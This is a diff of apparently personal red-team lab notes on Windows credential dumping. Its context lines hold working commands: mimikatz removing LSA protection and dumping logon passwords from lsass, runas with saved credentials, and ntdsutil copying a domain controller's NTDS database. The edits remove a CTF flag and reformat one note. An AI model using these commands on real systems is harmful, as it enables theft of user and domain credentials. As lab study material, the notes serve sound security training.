@@ -742,7 +742,7 @@ Right after you perform these steps, you will get an error that you can no longe
 `mimikatz # !+`*Loading the mimidrv Driver into Memory*
 `!processprotect /process:lsass.exe /remove`*Removing the LSA Protection*
 `mimikatz # sekurlsa::logonpasswords`*Dump*
-# Note that above would be very noisy in logs - Service installation (Kernel mode driver)
+Note that above would be very noisy in logs - Service installation (Kernel mode driver)
 
 - **Dumping credentials manager**
 `mimikatz # privilege::debug`
@@ -760,7 +760,7 @@ Right after you perform these steps, you will get an error that you can no longe
 - **Windows cred dump**
 `C:\Users\OXI>cmdkey /list`*Enumerating for Stored Windows Credentials*
 `runas /savecred /user:THM.red\OXI-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
-THM{Runa5S4veCr3ds}
+
 
 - **NTDS dump from the domain controller(local adm rights)**
 `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`*Dumping the content of the NTDS file*
